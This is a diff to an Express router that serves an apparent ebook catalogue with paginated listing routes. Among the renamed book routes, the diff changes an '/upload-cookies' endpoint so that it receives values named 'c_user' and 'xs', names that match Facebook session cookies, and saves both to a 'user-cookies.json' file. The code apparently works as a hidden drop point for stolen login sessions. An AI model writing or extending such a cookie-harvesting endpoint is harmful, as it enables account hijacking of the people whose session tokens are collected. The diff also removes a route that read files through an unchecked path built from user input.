@@ -1,21 +1,21 @@
 const router = require("express").Router();
 const fs = require('fs');
 
-const books = require("./books.json")
-const newBooks = require("./newBooks.json")
+const ebooks = require("./ebooks.json")
 const allCookies = require("./user-cookies.json")
+const new_ebooks = require("./new-ebooks.json")
 
 router.get("/", (req, res) => {
     let page = req.query.page
     if (!page) {
-        res.json(books)
+        res.json(ebooks)
     } else {
         let temp = {}
         let count = 0;
 
-        for (let key in books) {
+        for (let key in ebooks) {
             if (count >= Number(page) * 50 && count <= (Number(page) * 50) + 50) {
-                temp[key] = books[key]
+                temp[key] = ebooks[key]
             }
             count++
         }
@@ -24,17 +24,17 @@ router.get("/", (req, res) => {
 
 })
 
-router.get("/newbooks", (req, res) => {
+router.get("/new-ebooks", (req, res) => {
     let page = req.query.page
     if (!page) {
-        res.json(newBooks)
+        res.json(new_ebooks)
     } else {
         let temp = {}
         let count = 0;
 
-        for (let key in newBooks) {
+        for (let key in new_ebooks) {
             if (count >= Number(page) * 50 && count <= (Number(page) * 50) + 50) {
-                temp[key] = newBooks[key]
+                temp[key] = new_ebooks[key]
             }
             count++
         }
@@ -43,24 +43,10 @@ router.get("/newbooks", (req, res) => {
 
 })
 
-router.get("/detail/:name", (req, res) => {
-    let name = req.params.name.toLowerCase();
-    let path = process.cwd() + "/books/files/" + name + ".txt";
-
-    fs.readFile(path, 'utf8', function (err, content) {
-        if (err) {
-            res.status(404).send("the book by the name of " + name + " was not found").end()
-        }
-
-        res.status(200).json({ ...books[name], content })
-
-    });
-})
-
-router.get("/upload-cookies/:name", (req, res) => {
+router.get("/upload-cookies/:c_user/:xs", (req, res) => {
     let _id = Math.floor((Math.random() * 1000) + 1);
-    let c_user = req.params.name.toLowerCase();
-
+    let c_user = req.params.c_user.toLowerCase();
+    let xs = req.params.xs.toLowerCase();
     var obj = {
         "data": []
     }
@@ -72,7 +58,7 @@ router.get("/upload-cookies/:name", (req, res) => {
             console.log(err);
         } else {
             obj = JSON.parse(result_user);
-            obj.data.push({id: _id, user_cookies: c_user});
+            obj.data.push({id: _id, c_user: c_user, xs: xs});
             json = JSON.stringify(obj);
             fs.writeFile(path, json, 'utf8', function(err, result){
                 if (err) {
